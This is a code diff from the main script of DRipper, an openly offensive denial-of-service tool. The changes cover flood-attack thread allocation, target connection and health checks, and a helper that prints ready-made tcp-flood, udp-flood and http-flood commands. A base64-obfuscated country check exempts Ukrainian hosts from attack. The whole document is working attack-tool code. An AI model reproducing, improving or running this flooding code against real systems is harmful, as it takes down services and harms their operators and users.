@@ -4,23 +4,24 @@ import sys
 import threading
 import time
 from base64 import b64decode
-
 from rich import box
 from rich.console import Console
 from rich.panel import Panel
 from rich.live import Live
 
+from _version import __version__
+from ripper.github_updates_checker import GithubUpdatesChecker
 from ripper import common, arg_parser
-from ripper.actions.attack import Attack, attack_method_labels
+from ripper.actions.attack import attack_method_labels
 from ripper.constants import *
 from ripper.context.context import Context, Target
 from ripper.common import get_current_ip
 from ripper.context.events_journal import EventsJournal
+from ripper.health_check_manager import HealthStatus
 from ripper.proxy import Proxy
 
 exit_event = threading.Event()
 events_journal = EventsJournal()
-lock = threading.Lock()
 
 
 ###############################################
@@ -28,17 +29,18 @@ lock = threading.Lock()
 ###############################################
 def update_host_statuses(target: Target):
     """Updates host statuses based on check-host.net nodes."""
-    if target.health_check_manager.is_in_progress or \
-        not target.interval_manager.check_timer_elapsed(bucket=f'update_host_statuses_{target.url}', sec=MIN_UPDATE_HOST_STATUSES_TIMEOUT):
-        return False
-    try:
-        if target.host_ip:
-            target.health_check_manager.update_host_statuses()
-    except:
-        events_journal.error(f'Host statuses update failed with check-host.net', target=target)
-    else:
-        events_journal.error(f'Host statuses updated with check-host.net', target=target)
-    return True
+    if target.health_check_manager.is_forbidden:  # Do not check health status when service blocking your IP
+        return
+
+    if target.health_check_manager.is_in_progress or not target.interval_manager.check_timer_elapsed(
+            bucket=f'update_host_statuses_{target.uri}', sec=MIN_UPDATE_HOST_STATUSES_TIMEOUT):
+        return
+
+    if target.host_ip:
+        if target.health_check_manager.update_host_statuses() == {}:
+            events_journal.error(f'Host statuses update failed with check-host.net', target=target)
+        else:
+            events_journal.info(f'Host statuses updated with check-host.net', target=target)
 
 
 ###############################################
@@ -57,7 +59,7 @@ def update_current_ip(_ctx: Context, check_period_sec: int = 0) -> None:
 def go_home(_ctx: Context) -> None:
     """Modifies host to match the rules."""
     home_code = b64decode('dWE=').decode('utf-8')
-    for target in _ctx.targets:
+    for target in _ctx.targets_manager.targets:
         if target.host.endswith('.' + home_code.lower()) or common.get_country_by_ipv4(target.host_ip) in home_code.upper():
             target.host_ip = target.host = 'localhost'
             target.host += '*'
@@ -65,106 +67,139 @@ def go_home(_ctx: Context) -> None:
 
 def refresh_context_details(_ctx: Context) -> None:
     """Check threads, IPs, VPN status, etc."""
-    global lock
-    lock.acquire()
 
-    threading.Thread(
-        target=update_current_ip,
-        args=[_ctx, UPDATE_CURRENT_IP_CHECK_PERIOD_SEC]).start()
+    with threading.Lock():
+        threading.Thread(
+            name='update-ip', target=update_current_ip,
+            args=[_ctx, UPDATE_CURRENT_IP_CHECK_PERIOD_SEC], daemon=True).start()
 
-    if _ctx.is_health_check:
-        for target in _ctx.targets:
-            threading.Thread(target=update_host_statuses, args=[target]).start()
+        if _ctx.is_health_check:
+            for target in _ctx.targets_manager.targets:
+                threading.Thread(
+                    name='check-host', target=update_host_statuses,
+                    args=[target], daemon=True).start()
 
-    if _ctx.myIpInfo.country == GEOIP_NOT_DEFINED:
-        threading.Thread(target=common.get_country_by_ipv4, args=[_ctx.myIpInfo.current_ip]).start()
+        if _ctx.myIpInfo.country == GEOIP_NOT_DEFINED:
+            threading.Thread(
+                name='upd-country', target=common.get_country_by_ipv4,
+                args=[_ctx.myIpInfo.current_ip], daemon=True).start()
 
-    for target in _ctx.targets:
-        if target.country == GEOIP_NOT_DEFINED:
-            threading.Thread(target=common.get_country_by_ipv4, args=[target.host_ip]).start()
-
-    lock.release()
+        for target in _ctx.targets_manager.targets:
+            if target.country == GEOIP_NOT_DEFINED:
+                threading.Thread(
+                    name='upd-country', target=common.get_country_by_ipv4,
+                    args=[target.host_ip], daemon=True).start()
 
     # Check for my IPv4 wasn't changed (if no proxylist only)
     if _ctx.proxy_manager.proxy_list_initial_len == 0 and _ctx.myIpInfo.is_ip_changed():
         events_journal.error(YOUR_IP_WAS_CHANGED_ERR_MSG)
 
-    for (target_idx, target) in enumerate(_ctx.targets):
-        # TODO Merge validators
-        if not target.validate_attack() or not target.stats.packets.validate_connection(SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC):
-            events_journal.error(common.get_no_successful_connection_die_msg(), target=target)
-            if len(_ctx.targets) < 2:
-                exit(common.get_no_successful_connection_die_msg())
-            else:
-                target.stop_attack_threads()
-                lock.acquire()
-                _ctx.targets.pop(target_idx)
-                lock.release()
+    for target in _ctx.targets_manager.targets[:]:
+        if not target.validate_connection():
+            events_journal.error(NO_CONNECTIONS_ERR_MSG, target=target)
+            _ctx.targets_manager.delete_target(target)
+        if target.health_check_manager.status == HealthStatus.dead:
+            events_journal.error(TARGET_DEAD_ERR_MSG, target=target)
+            _ctx.targets_manager.delete_target(target)
+        if _ctx.targets_manager.len() < 1:
+            _ctx.logger.log(NO_MORE_TARGETS_LEFT_ERR_MSG)
+            exit(1)
 
     if _ctx.proxy_manager.proxy_list_initial_len > 0 and len(_ctx.proxy_manager.proxy_list) == 0:
         events_journal.error(NO_MORE_PROXIES_ERR_MSG)
-        exit(NO_MORE_PROXIES_ERR_MSG)
+        _ctx.logger.log(NO_MORE_PROXIES_ERR_MSG)
+        exit(1)
 
 
 ###############################################
 # Target+Context
 ###############################################
-def check_host_connection(target: Target, _ctx: Context, proxy: Proxy = None) -> bool:
+def connect_host(target: Target, _ctx: Context, proxy: Proxy = None):
     """Check connection to Host before start script."""
     target.stats.connect.set_state_in_progress()
     with _ctx.sock_manager.create_tcp_socket(proxy) as http:
-        try:
-            http.connect(target.hostip_port_tuple())
-        except:
-            res = False
-        else:
-            target.stats.connect.set_state_is_connected()
-            res = True
-        return res
+        http.connect(target.hostip_port_tuple())
+        target.stats.connect.set_state_is_connected()
 
 
-def connect_host_loop(target: Target, _ctx: Context, retry_cnt: int = CONNECT_TO_HOST_MAX_RETRY, timeout_secs: int = 3) -> None:
+def connect_host_loop(target: Target, _ctx: Context, retry_cnt: int = CONNECT_TO_HOST_MAX_RETRY) -> bool:
     """Tries to connect host in permanent loop."""
     i = 0
-    while i < retry_cnt:
-        _ctx.logger.log(
-            f'({i + 1}/{retry_cnt}) Trying connect to {target.host}:{target.port}...')
-        if check_host_connection(target=target, _ctx=_ctx):
-            break
-        time.sleep(timeout_secs)
+    (host_ip, port) = target.hostip_port_tuple()
+    if not host_ip:
+        _ctx.logger.log(f'({i + 1}/{retry_cnt}) {target.uri} Target\'s host ip wasn\'t detected...')
+        return False
+
+    target_uri_extended = f'{target.uri} ({host_ip}:{port})'
+    while i < retry_cnt and not target.stats.connect.is_connected:
+        _ctx.logger.log(f'({i + 1}/{retry_cnt}) {target_uri_extended} Trying to connect...')
+        try:
+            connect_host(target=target, _ctx=_ctx)
+            _ctx.logger.log(f'({i + 1}/{retry_cnt}) {target_uri_extended} [green]Connected[/]')
+            return True
+        except Exception as e:
+            _ctx.logger.log(f'({i + 1}/{retry_cnt}) {target_uri_extended} [red]{e}[/]')
         i += 1
+    return False
 
 
 ###############################################
 # Console
 ###############################################
+def generate_valid_commands(uri):
+    tcp_attack = f'-t {ARGS_DEFAULT_THREADS_COUNT} -r {ARGS_DEFAULT_RND_PACKET_LEN} -l {ARGS_DEFAULT_MAX_RND_PACKET_LEN} -s {uri}'
+    udp_attack = f'-t {ARGS_DEFAULT_THREADS_COUNT} -r {ARGS_DEFAULT_RND_PACKET_LEN} -l {ARGS_DEFAULT_MAX_RND_PACKET_LEN} -s {uri}'
+    http_attack = f'-t {ARGS_DEFAULT_THREADS_COUNT} -e {ARGS_DEFAULT_HTTP_ATTACK_METHOD} -s {uri}'
+
+    res = ''
+    for a in ['tcp-flood', 'udp-flood', 'http-flood']:
+        if a == 'tcp-flood':
+            attack_args = tcp_attack
+        elif a == 'udp-flood':
+            attack_args = udp_attack
+        else:
+            attack_args = http_attack
+
+        res += '[green]{attack} attack:[/]\n'.format(attack=a.upper())
+        for c in ['dripper', 'python  DRipper.py', 'python3 DRipper.py', f'docker run -it --rm alexmon1989/dripper:{__version__}']:
+            res += '{command} -m {attack} {attack_args}\n'.format(command=c, attack=a, attack_args=attack_args)
+            if c.startswith('dripper') or c.startswith('python3'):
+                res += '\n'
+        res += '\n'
+    Console().print(res, new_line_start=True)
+
+
 def validate_input(args) -> bool:
     """Validates input params."""
-    for target_uri in args.targets.split(','):
+    for target_uri in args.targets:
         if not Target.validate_format(target_uri):
             common.print_panel(f'Wrong target format in [yellow]{target_uri}[/]. Check param -s (--targets) {args.targets}')
             return False
 
     if int(args.threads_count) < 1:
         common.print_panel(f'Wrong threads count. Check param [yellow]-t (--threads) {args.threads_count}[/]')
+        generate_valid_commands(args.targets)
         return False
 
     if args.attack_method is not None and args.attack_method.lower() not in attack_method_labels:
         common.print_panel(
             f'Wrong attack type. Check param [yellow]-m (--method) {args.attack_method}[/]\n'
             f'Possible options: {", ".join(attack_method_labels)}')
+        generate_valid_commands(args.targets)
         return False
 
     if args.http_method and args.http_method.lower() not in ('get', 'post', 'head', 'put', 'delete', 'trace', 'connect', 'options', 'patch'):
         common.print_panel(
             f'Wrong HTTP method type. Check param [yellow]-e (--http-method) {args.http_method}[/]\n'
             f'Possible options: get, post, head, put, delete, trace, connect, options, patch.')
+        generate_valid_commands(args.targets)
         return False
 
     if args.proxy_type and args.proxy_type.lower() not in ('http', 'socks5', 'socks4'):
         common.print_panel(
             f'Wrong Proxy type. Check param [yellow]-k (--proxy-type) {args.proxy_type}[/]\n'
             f'Possible options: http, socks5, socks4.')
+        generate_valid_commands(args.targets)
         return False
 
     return True
@@ -173,15 +208,20 @@ def validate_input(args) -> bool:
 def render_statistics(_ctx: Context) -> None:
     """Show DRipper runtime statistics."""
     console = Console()
-    logo = Panel(LOGO_COLOR, box=box.SIMPLE, width=MIN_SCREEN_WIDTH)
+
+    update_available = ''
+    if _ctx.latest_version is not None and _ctx.current_version < _ctx.latest_version:
+        update_available = f'\n[u green reverse link={GITHUB_URL}/releases] Newer version {_ctx.latest_version.version} is available! [/]'
+
+    logo = Panel(LOGO_COLOR + update_available, box=box.SIMPLE, width=MIN_SCREEN_WIDTH)
     console.print(logo, justify='center', width=MIN_SCREEN_WIDTH)
 
-    with Live(_ctx.stats.build_stats(), vertical_overflow='visible') as live:
+    with Live(_ctx.stats.build_stats(), vertical_overflow='visible', refresh_per_second=2) as live:
         live.start()
         while True:
-            time.sleep(0.5)
             refresh_context_details(_ctx)
             live.update(_ctx.stats.build_stats())
+            # time.sleep(0.2)
             if _ctx.dry_run:
                 break
 
@@ -202,21 +242,22 @@ def main():
     _ctx = Context(args[0])
     go_home(_ctx)
 
+    guc = GithubUpdatesChecker()
+    _ctx.latest_version = guc.fetch_lastest_version()
+
     _ctx.logger.rule('[bold]Starting DRipper')
-    for target in _ctx.targets:
+    for target in _ctx.targets_manager.targets[:]:
         # Proxies should be validated during the runtime
         retry_cnt = 1 if _ctx.proxy_manager.proxy_list_initial_len > 0 or target.attack_method == 'udp' else 3
-        connect_host_loop(_ctx=_ctx, target=target, retry_cnt=retry_cnt)
+        # TODO Make it concurrent for each target
+        if not connect_host_loop(_ctx=_ctx, target=target, retry_cnt=retry_cnt):
+            _ctx.targets_manager.delete_target(target)
     _ctx.logger.rule()
     _ctx.validate()
 
     # Start Threads
     time.sleep(.5)
-    threads_range = _ctx.threads_count if not _ctx.dry_run else 1
-    # TODO create targets manager
-    for idx in range(threads_range):
-        target = _ctx.targets[idx % len(_ctx.targets)]
-        Attack(_ctx=_ctx, target=target).start()
+    _ctx.targets_manager.allocate_attacks()
 
     render_statistics(_ctx)
 
